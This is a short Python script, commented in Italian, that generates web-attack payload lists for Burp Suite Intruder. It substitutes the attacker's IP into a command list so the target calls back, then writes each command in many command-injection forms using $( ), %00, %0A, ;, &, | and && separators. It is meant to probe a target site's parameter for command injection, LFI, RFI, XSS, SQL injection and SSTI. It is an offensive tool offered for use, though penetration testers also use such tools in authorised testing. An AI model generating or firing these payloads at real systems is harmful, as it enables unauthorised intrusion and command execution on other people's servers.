import sys

if len(sys.argv) < 3:
    print("Usage: python script.py <ATTACKER-IP> <FILE-IN>")
    print("ATTACER-IP: IP della scheda di rete dell'attaccante su cui si riceveranno chiamate dalla macchina target")
    print("FILE-IN: file contenente la lista di ingresso dei comandi")
    print("")
    print("Lo script genera una lista di comandi da caricare su burpSuite intruder per verificare se il parametro individuato sul sito target")
    print("è iniettabile ai seguenti tipi di attacco: commandi injection, LFI, RFI, XSS, SQL-injection, SSTI")
    print("")
    sys.exit(1)

ip_address = sys.argv[1]
file_in = sys.argv[2]
with open(file_in, 'r') as f:
    with open('out-command-injection-list.txt', 'w') as out:
        for line in f:
            line = line.strip()
            if line.strip() == "" or line.startswith("=="):
            	# se leggo da input una stringa vuota o qualche cosa che inizia per == non faccio niente
                continue
            if "<ATTACKER-IP>" in line:
            	# se ho comandi con ATTACKER-IP lo sostituisco con l'IP reale
                line = line.replace("<ATTACKER-IP>", ip_address)
            # scrivo il comando sul file di uscita    
            out.write(line + '\n')
            
            # Lo script python restituisce poi per ogni comando le seguenti regole
            # $(<COMANDO>)
            out.write('$(' + line + ')\n')            
            # %00<COMANDO>
            out.write('%00' + line + '\n')
            # <COMANDO>%00
            out.write(line + '%00\n')
            # <COMANDO>%
            out.write(line + '%\n')
            # %0A<COMANDO>
            out.write('%0A' + line + '\n')            
            # <COMANDO>%0A
            out.write(line + '%0A\n')
            # <COMANDO>?
            out.write(line + '?\n')
            # <COMANDO>?%00
            out.write(line + '?%00\n')            
            # <COMANDO>;
            out.write(line + ';\n')
            # <COMANDO>&
            out.write(line + '&\n')
            # <COMANDO>\n
            out.write(line + '\\\\n\n')            
            # ||<COMANDO>||
            out.write('||' + line + '||\n')            
            # |<COMANDO>|
            out.write('|' + line + '|\n')            
            # ;<COMANDO>|
            out.write(';' + line + '|\n') 
            # & <COMANDO>|
            out.write('& ' + line + '|\n')               
            # && <COMANDO>|
            out.write('&& ' + line + '|\n')  
            
